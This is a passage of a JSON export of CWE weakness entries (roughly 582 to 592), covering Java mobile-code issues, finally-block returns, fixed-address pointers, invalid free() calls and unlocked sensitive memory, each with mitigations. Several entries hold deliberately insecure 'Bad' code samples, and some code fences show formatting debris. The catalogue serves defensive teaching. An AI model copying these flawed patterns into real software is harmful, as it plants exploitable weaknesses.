        "Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your product is running."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "In most situations the array should be made private."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following Java Applet code mistakenly declares an array public, final and static."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic final class urlTool extends Applet {\n\t\tpublic final static URL[] urls;\n\t\t...\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "OBJ10-J",
          "EntryName": "Do not use public static nonfinal variables"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected Access Points"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "583",
      "Name": "finalize() Method Declared Public",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product violates secure coding principles for mobile code by declaring a finalize() method public.",
      "ExtendedDescription": "A product should never call finalize explicitly, except to call super.finalize() inside an implementation of finalize(). In mobile code situations, the otherwise error prone practice of manual garbage collection can become a security threat if an attacker can maliciously invoke a finalize() method because it is declared with public access.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "668",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Alter Execution Logic",
            "Execute Unauthorized Code or Commands",
            "Modify Application Data"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If you are using finalize() as it was designed, there is no reason to declare finalize() with anything other than protected access."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following Java Applet code mistakenly declares a public finalize() method."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic final class urlTool extends Applet {\n\t\tpublic void finalize() {\n\t\t\t...\n\t\t}\n\t\t...\n\t}\n```"
            },
            {
              "BodyText": "Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your product is running."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MET12-J",
          "EntryName": "Do not use finalizers"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP28",
          "EntryName": "Unexpected access points"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "584",
      "Name": "Return Inside Finally Block",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code has a return statement inside a finally block, which will cause any thrown exception in the try block to be discarded.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "705",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Alter Execution Logic"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Do not use a return statement inside the finally block. The finally block should have \"cleanup\" code."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following code excerpt, the IllegalArgumentException will never be delivered to the caller. The finally block will cause the exception to be discarded."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\ttry {\n\t\t...\n\t\tthrow IllegalArgumentException();\n\t}\n\tfinally {\n\t\treturn r;\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ERR04-J",
          "EntryName": "Do not complete abruptly from a finally block"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ERR05-J",
          "EntryName": "Do not let checked exceptions escape from a finally block"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP6",
          "EntryName": "Incorrect Exception Behavior"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "585",
      "Name": "Empty Synchronized Block",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product contains an empty synchronized block.",
      "ExtendedDescription": "An empty synchronized block does not actually accomplish any synchronization and may indicate a troubled section of code. An empty synchronized block can occur because code no longer needed within the synchronized block is commented out without removing the synchronized block.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1071",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ],
          "Note": "An empty synchronized block will wait until nobody else is using the synchronizer being specified. While this may be part of the desired behavior, because you haven't protected the subsequent code by placing it inside the synchronized block, nothing is stopping somebody else from modifying whatever it was you were waiting for while you run the subsequent code."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When you come across an empty synchronized statement, or a synchronized statement in which the code has been commented out, try to determine what the original intentions were and whether or not the synchronized block is still necessary."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-214",
          "Entries": [
            {
              "IntroText": "The following code attempts to synchronize on an object, but does not execute anything in the synchronized block. This does not actually accomplish anything and may be a sign that a programmer is wrestling with synchronization but has not yet achieved the result they intend."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tsynchronized(this) { }\n```"
            },
            {
              "BodyText": "Instead, in a correct usage, the synchronized statement should contain procedures that access or modify data that is exposed to multiple threads. For example, consider a scenario in which several threads are accessing student records at the same time. The method which sets the student ID to a new value will need to make sure that nobody else is accessing this data at the same time and will require synchronization."
            },
            {
              "Nature": "Good",
              "ExampleCode": "```\n\tpublic void setID(int ID){\n\t\tsynchronized(this){\n\t\t\tthis.ID = ID;\n\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP21",
          "EntryName": "Multiple locks/unlocks"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-478",
          "Title": "Intrinsic Locks and Synchronization (in Java)",
          "URL": "https://docs.oracle.com/javase/tutorial/essential/concurrency/locksync.html",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "586",
      "Name": "Explicit Call to Finalize()",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product makes an explicit call to the finalize() method from outside the finalizer.",
      "ExtendedDescription": "While the Java Language Specification allows an object's finalize() method to be called from outside the finalizer, doing so is usually a bad idea. For example, calling finalize() explicitly means that finalize() will be called more than once: the first time will be the explicit call and the last time will be the call that is made after the object is garbage collected.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1076",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Other"
          ],
          "Impact": [
            "Unexpected State",
            "Quality Degradation"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation",
            "Testing"
          ],
          "Description": "Do not make explicit calls to finalize(). Use static analysis tools to spot such instances."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code fragment calls finalize() explicitly:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n```\n// time to clean up* \n\twidget.finalize();"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MET12-J",
          "EntryName": "Do not use finalizers"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "587",
      "Name": "Assignment of a Fixed Address to a Pointer",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product sets a pointer to a specific address other than NULL or 0.",
      "ExtendedDescription": "Using a fixed address is not portable, because that address will probably not be valid in all environments or platforms.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "344",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "758",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Class": "Assembly",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "If one executes code at a known location, an attacker might be able to inject code there beforehand."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart",
            "Reduce Maintainability",
            "Reduce Reliability"
          ],
          "Note": "If the code is ported to another platform or environment, the pointer is likely to be invalid and cause a crash."
        },
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Memory",
            "Modify Memory"
          ],
          "Note": "The data at a known pointer location can be easily read or influenced by an attacker."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Never set a pointer to a fixed address."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-192",
          "Entries": [
            {
              "IntroText": "This code assumes a particular function will always be found at a particular address. It assigns a pointer to that address and calls the function."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint (*pt2Function) (float, char, char)=0x08040000;\n\tint result2 = (*pt2Function) (12, 'a', 'b');\n```\n// Here we can inject code to execute.*"
            },
            {
              "BodyText": "The same function may not always be found at the same memory address. This could lead to a crash, or an attacker may alter the memory at the expected address, leading to arbitrary code execution."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "INT36-C",
          "EntryName": "Converting a pointer to integer or integer to pointer",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "588",
      "Name": "Attempt to Access Child of a Non-structure Pointer",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "Casting a non-structure type to a structure type and accessing a field can lead to memory access errors or data corruption.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "704",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "758",
          "ViewID": "1000"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Memory"
          ],
          "Note": "Adjacent variables in memory may be corrupted by assignments performed on fields after the cast."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "Execution may end due to a memory access error."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Requirements"
          ],
          "Description": "The choice could be made to use a language that is not susceptible to these issues."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Review of type casting operations can identify locations where incompatible types are cast."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example demonstrates the weakness."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tstruct foo\n\t{\n\t\tint i;\n\t}\n\t...\n\tint main(int argc, char **argv)\n\t{\n\t\t*foo = (struct foo *)main;\n\t\tfoo->i = 2;\n\t\treturn foo->i;\n\t}\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-3510",
          "Description": "JSON decoder accesses a C union using an invalid offset to an object",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-3510"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP7",
          "EntryName": "Faulty Pointer Use"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "589",
      "Name": "Call to Non-ubiquitous API",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses an API function that does not exist on all versions of the target platform. This could cause portability problems or inconsistencies that allow denial of service or other consequences.",
      "ExtendedDescription": "Some functions that offer security features supported by the OS are not available on all versions of the OS in common use. Likewise, functions are often deprecated or made obsolete for security reasons and should not be used.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "474",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Always test your code on any platform on which it is targeted to run on."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Test your code on the newest and oldest platform on which it is targeted to run on."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Develop a system to test for API functions that are not portable."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "MET02-J",
          "EntryName": "Do not use deprecated or obsolete classes or methods"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SER00-J",
          "EntryName": "Maintain serialization compatibility during class evolution"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "RelatedAttackPatterns": [
        "96"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "590",
      "Name": "Free of Memory not on the Heap",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product calls free() on a pointer to memory that was not allocated using associated heap allocation functions such as malloc(), calloc(), or realloc().",
      "ExtendedDescription": "When free() is called on an invalid pointer, the program's memory management data structures may become corrupted. This corruption can cause the program to crash or, in some circumstances, an attacker may be able to cause free() to operate on controllable memory locations to modify critical program variables or execute code.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "762",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "123",
          "ViewID": "1000"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Modify Memory"
          ],
          "Note": "There is the potential for arbitrary code execution with privileges of the vulnerable program via a \"write, what where\" primitive. If pointers to memory which hold user information are freed, a malicious user will be able to write 4 bytes anywhere in memory."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Only free pointers that you have called malloc on previously. This is the recommended solution. Keep track of which pointers point at the beginning of valid chunks and free them only once."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Before freeing a pointer, the programmer should make sure that the pointer was previously allocated on the heap and that the memory belongs to the programmer. Freeing an unallocated pointer will cause undefined behavior in the program."
        },
        {
          "MitigationID": "MIT-4.6",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, glibc in Linux provides protection against free of invalid pointers.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use a language that provides abstractions for memory allocation and deallocation."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use a tool that dynamically detects memory management problems, such as valgrind."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In this example, an array of record_t structs, bar, is allocated automatically on the stack as a local variable and the programmer attempts to call free() on the array. The consequences will vary based on the implementation of free(), but it will not succeed in deallocating the memory."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid foo(){\n\t\t\trecord_t bar[MAX_SIZE];\n```\n/* do something interesting with bar */* \n\t\t\t\n\t\t\t...\n\t\t\tfree(bar);}"
            },
            {
              "BodyText": "This example shows the array allocated globally, as part of the data segment of memory and the programmer attempts to call free() on the array."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\trecord_t bar[MAX_SIZE]; //Global var\n\tvoid foo(){\n```\n/* do something interesting with bar */* \n\t\t\t...\n\t\t\tfree(bar);}"
            },
            {
              "BodyText": "Instead, if the programmer wanted to dynamically manage the memory, malloc() or calloc() should have been used."
            },
            {
              "Nature": "Good",
              "ExampleCode": "```\n\tvoid foo(){\n\t\t\trecord_t *bar = (record_t*)malloc(MAX_SIZE*sizeof(record_t));\n```\n/* do something interesting with bar */* \n\t\t\t\n\t\t\t...\n\t\t\tfree(bar);}"
            },
            {
              "BodyText": "Additionally, you can pass global variables to free() when they are pointers to dynamically allocated memory."
            },
            {
              "Nature": "Good",
              "ExampleCode": "```\n\trecord_t *bar; //Global var\n\tvoid foo(){\n\t\t\tbar = (record_t*)malloc(MAX_SIZE*sizeof(record_t));\n```\n/* do something interesting with bar */* \n\t\t\t\n\t\t\t...\n\t\t\tfree(bar);}"
            }
          ]
        }
      ],
      "AffectedResources": [
        "Memory"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM34-C",
          "EntryName": "Only free memory allocated dynamically",
          "MappingFit": "Exact"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "WIN30-C",
          "EntryName": "Properly pair allocation and deallocation functions",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP12",
          "EntryName": "Faulty Memory Release"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-480",
          "Title": "Valgrind",
          "URL": "http://valgrind.org/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Other",
          "Note": "In C++, if the new operator was used to allocate the memory, it may be allocated with the malloc(), calloc() or realloc() family of functions in the implementation. Someone aware of this behavior might choose to map this problem to CWE-590 or to its parent, CWE-762, depending on their perspective."
        }
      ]
    },
    {
      "ID": "591",
      "Name": "Sensitive Data Storage in Improperly Locked Memory",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product stores sensitive data in memory that is not locked, or that has been incorrectly locked, which might cause the memory to be written to swap files on disk by the virtual memory manager. This can make the data more accessible to external actors.",
      "ExtendedDescription": "On Windows systems the VirtualLock function can lock a page of memory to ensure that it will remain present in memory and not be swapped to disk. However, on older versions of Windows, such as 95, 98, or Me, the VirtualLock() function is only a stub and provides no protection. On POSIX systems the mlock() call ensures that a page will stay resident in memory but does not guarantee that the page will not appear in the swap. Therefore, it is unsuitable for use as a protection mechanism for sensitive data. Some platforms, in particular Linux, do make the guarantee that the page will not be swapped, but this is non-standard and is not portable. Calls to mlock() also require supervisor privilege. Return values for both of these calls must be checked to ensure that the lock operation was actually successful.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "413",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Read Memory"
          ],
          "Note": "Sensitive data that is written to a swap file may be exposed."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Identify data that needs to be protected from swapping and choose platform-appropriate protection mechanisms."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Check return values to ensure locking operations are successful."
        }
      ],
      "AffectedResources": [
        "Memory"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A8",
          "EntryName": "Insecure Storage",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM06-C",
          "EntryName": "Ensure that sensitive data is not written out to disk"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP23",
          "EntryName": "Exposed Data"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "592",
      "Name": "DEPRECATED: Authentication Bypass Issues",
      "Abstraction": "Class",
      "Structure": "Simple",
